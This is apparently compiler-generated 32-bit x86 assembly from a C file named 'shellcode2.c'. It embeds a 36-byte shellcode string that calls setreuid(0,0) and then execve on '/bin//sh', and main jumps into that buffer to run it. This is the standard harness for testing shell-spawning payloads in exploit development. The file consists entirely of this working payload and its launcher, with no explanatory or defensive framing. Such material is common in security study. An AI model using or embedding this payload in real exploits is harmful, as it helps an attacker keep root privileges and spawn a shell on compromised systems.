	.file	"shellcode2.c"
	.text
.Ltext0:
	.globl	shellcode
	.data
	.align 32
	.type	shellcode, @object
	.size	shellcode, 36
shellcode:
	.string	"1\300\260F1\3331\311\315\2001\300Ph//shh/bin\211\343PS\211\3411\322\260\013\315\200"
	.text
	.globl	main
	.type	main, @function
main:
.LFB0:
	.file 1 "shellcode2.c"
	.loc 1 11 0
	.cfi_startproc
	leal	4(%esp), %ecx
	.cfi_def_cfa 1, 0
	andl	$-16, %esp
	pushl	-4(%ecx)
	pushl	%ebp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	movl	%esp, %ebp
	pushl	%ecx
	.cfi_escape 0xf,0x3,0x75,0x7c,0x6
	subl	$20, %esp
	.loc 1 13 0
	movl	$shellcode, -12(%ebp)
	.loc 1 14 0
	movl	-12(%ebp), %eax
	call	*%eax
.LVL0:
	movl	$0, %eax
	.loc 1 15 0
	addl	$20, %esp
	popl	%ecx
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	popl	%ebp
	.cfi_restore 5
	leal	-4(%ecx), %esp
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE0:
	.size	main, .-main
.Letext0:
	.section	.note.GNU-stack,"",@progbits
